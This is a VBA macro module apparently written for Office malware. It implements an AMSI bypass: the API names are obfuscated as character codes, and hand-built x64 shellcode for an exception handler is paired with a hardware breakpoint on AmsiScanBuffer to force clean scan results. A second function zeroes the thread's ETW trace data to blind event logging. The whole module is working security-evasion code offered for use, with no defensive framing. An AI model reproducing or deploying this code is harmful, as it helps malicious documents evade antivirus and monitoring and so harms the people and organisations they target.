Option Explicit

Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)

Private GsTebStubAddr As LongPtr
Private VEHHandlerAddr As LongPtr

' Public entry: install hardware-breakpoint AMSI bypass.
Public Function InstallAmsiHWBP() As Boolean
    ' Find AmsiScanBuffer; amsi.dll should already be loaded by Office.
    Dim hAmsi As LongPtr
    hAmsi = GetMod(MkStr(97, 109, 115, 105, 46, 100, 108, 108))   ' amsi.dll
    If hAmsi = 0 Then Exit Function
    Dim pAmsiScan As LongPtr
    pAmsiScan = GetProc(hAmsi, MkStr(65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114))   ' AmsiScanBuffer
    If pAmsiScan = 0 Then Exit Function

    ' Allocate, write, and protect the VEH handler stub.
    If VEHHandlerAddr = 0 Then
        Dim page As LongPtr
        page = AllocRW(256)
        If page = 0 Then Exit Function
        Dim h() As Byte
        h = BuildVEHHandler()
        CopyMemory page, VarPtr(h(0)), UBound(h) - LBound(h) + 1
        If Not MakeRX(page, 256) Then Exit Function
        VEHHandlerAddr = page
    End If

    ' Register the handler. RtlAddVectoredExceptionHandler is not a syscall but
    ' ResolveSyscalls already stored its address in the table (the Rtl* branch).
    Dim hVEH As LongPtr
    hVEH = SysCall2(MkStr(82, 116, 108, 65, 100, 100, 86, 101, 99, 116, 111, 114, 101, 100, 69, 120, 99, 101, 112, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114), _
                    1, VEHHandlerAddr)
    If hVEH = 0 Then Exit Function

    ' Set DR0 = &AmsiScanBuffer, DR7 = 1 (L0 enable, type=execute, len=00).
    Dim ctx As CONTEXT64
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
    ctx.Dr0 = pAmsiScan
    ctx.Dr7 = &H1
    Dim status As Long
    status = CLng(SysCall2(MkStr(78, 116, 83, 101, 116, 67, 111, 110, 116, 101, 120, 116, 84, 104, 114, 101, 97, 100), _
                           -2&, VarPtr(ctx)))   ' -2 = NtCurrentThread pseudo-handle
    If status <> STATUS_SUCCESS Then Exit Function

    InstallAmsiHWBP = True
End Function

' Public entry: zero TEB.EtwTraceData on the current thread.
Public Function KillEtwForThisThread() As Boolean
    Dim teb As LongPtr
    teb = CurrentTeb()
    If teb = 0 Then Exit Function
    Dim zero As LongLong
    zero = 0
    CopyMemory teb + &H2C0, VarPtr(zero), 8
    KillEtwForThisThread = True
End Function

' Returns the current TEB by executing a tiny `mov rax, gs:[0x30]; ret` stub.
Private Function CurrentTeb() As LongPtr
    If GsTebStubAddr = 0 Then
        Dim page As LongPtr
        page = AllocRW(32)
        If page = 0 Then Exit Function
        Dim b() As Byte
        ReDim b(0 To 9)
        ' 65 48 8B 04 25 30 00 00 00   mov rax, gs:[0x30]
        b(0) = &H65: b(1) = &H48: b(2) = &H8B: b(3) = &H4: b(4) = &H25
        b(5) = &H30: b(6) = &H0: b(7) = &H0: b(8) = &H0
        ' C3                            ret
        b(9) = &HC3
        CopyMemory page, VarPtr(b(0)), 10
        If Not MakeRX(page, 32) Then Exit Function
        GsTebStubAddr = page
    End If
    CurrentTeb = Call0(GsTebStubAddr)
End Function

' Build the AMSI VEH handler byte sequence (62 bytes).
'
'   rcx = PEXCEPTION_POINTERS (per Windows VEH calling convention).
'
'   ;  mov rax, [rcx]                         ; ExceptionRecord
'   ;  cmp dword ptr [rax], 0x80000004        ; STATUS_SINGLE_STEP
'   ;  jne not_ours
'   ;  mov rdx, [rcx+8]                       ; ContextRecord
'   ;  mov r8, [rdx + 0x98]                   ; ctx->Rsp
'   ;  mov r8, [r8]                           ; return address from stack
'   ;  mov [rdx + 0xF8], r8                   ; ctx->Rip = return addr
'   ;  add qword [rdx + 0x98], 8              ; ctx->Rsp += 8
'   ;  mov qword [rdx + 0x78], 0              ; ctx->Rax = AMSI_RESULT_CLEAN
'   ;  mov rax, -1                            ; EXCEPTION_CONTINUE_EXECUTION
'   ;  ret
'   ;not_ours:
'   ;  xor eax, eax                           ; EXCEPTION_CONTINUE_SEARCH
'   ;  ret
'
' Critical offsets in CONTEXT64 (Win11 x64): Rsp=0x98, Rax=0x78, Rip=0xF8.
Private Function BuildVEHHandler() As Byte()
    Dim b() As Byte
    ReDim b(0 To 61)
    b(0) = &H48: b(1) = &H8B: b(2) = &H1                                        ' mov rax,[rcx]
    b(3) = &H81: b(4) = &H38                                                    ' cmp dword [rax],imm32
    b(5) = &H4: b(6) = &H0: b(7) = &H0: b(8) = &H80                             '   0x80000004
    b(9) = &H75: b(10) = &H30                                                   ' jne +48 -> b(59)
    b(11) = &H48: b(12) = &H8B: b(13) = &H51: b(14) = &H8                       ' mov rdx,[rcx+8]
    b(15) = &H4C: b(16) = &H8B: b(17) = &H82                                    ' mov r8,[rdx+disp32]
    b(18) = &H98: b(19) = &H0: b(20) = &H0: b(21) = &H0                         '   0x98 (Rsp)
    b(22) = &H4D: b(23) = &H8B: b(24) = &H0                                     ' mov r8,[r8]
    b(25) = &H4C: b(26) = &H89: b(27) = &H82                                    ' mov [rdx+disp32],r8
    b(28) = &HF8: b(29) = &H0: b(30) = &H0: b(31) = &H0                         '   0xF8 (Rip)
    b(32) = &H48: b(33) = &H83: b(34) = &H82                                    ' add qword [rdx+disp32],imm8
    b(35) = &H98: b(36) = &H0: b(37) = &H0: b(38) = &H0                         '   0x98 (Rsp)
    b(39) = &H8                                                                  '   +8
    b(40) = &H48: b(41) = &HC7: b(42) = &H82                                    ' mov qword [rdx+disp32],imm32
    b(43) = &H78: b(44) = &H0: b(45) = &H0: b(46) = &H0                         '   0x78 (Rax)
    b(47) = &H0: b(48) = &H0: b(49) = &H0: b(50) = &H0                          '   0
    b(51) = &H48: b(52) = &HC7: b(53) = &HC0                                    ' mov rax,imm32 (sign-ext)
    b(54) = &HFF: b(55) = &HFF: b(56) = &HFF: b(57) = &HFF                      '   -1
    b(58) = &HC3                                                                 ' ret
    b(59) = &H33: b(60) = &HC0                                                  ' xor eax,eax
    b(61) = &HC3                                                                 ' ret
    BuildVEHHandler = b
End Function
